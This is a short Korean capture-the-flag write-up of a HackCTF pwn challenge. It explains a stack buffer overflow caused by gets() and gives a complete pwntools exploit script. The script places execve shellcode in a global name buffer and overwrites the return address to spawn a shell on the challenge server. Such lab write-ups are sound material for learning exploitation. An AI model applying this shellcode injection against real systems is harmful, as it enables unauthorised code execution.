---
title: "[ HackCTF ] 내 버퍼가 흘러넘친다!!!"
date: 2023-03-07T12:22:04.284Z
categories: ["Wargame", "HackCTF"]
tags: ["HackCTF","pwn"]
---
### **문제 분석**

---

![](/images/50071ced-062c-4b62-ad3a-7283ba190bc4-image.png)

이름을 입력받고 gets 함수로 다시 값을 입력받고 있다.

여기서 입력받는 문자열의 길이를 확인하지 않아 BOF가 발생하게 된다.

<br>
<br>

### **문제 풀이**

---

변수 s는 크기가 작아 쉘코드를 넣을 수 없다.

따라서 name에 쉘코드를 넣고 BOF를 발생시켜 return address를 name으로 바꿔주면 된다.

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3003)

name = 0x804a060

context.arch = 'i386'
shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = ''
payload += '\x90'*0x14
payload += '\x90'*4
payload += p32(name)

p.sendlineafter('Name : ', shellcode)
p.sendlineafter('input : ', payload)

p.interactive()
```
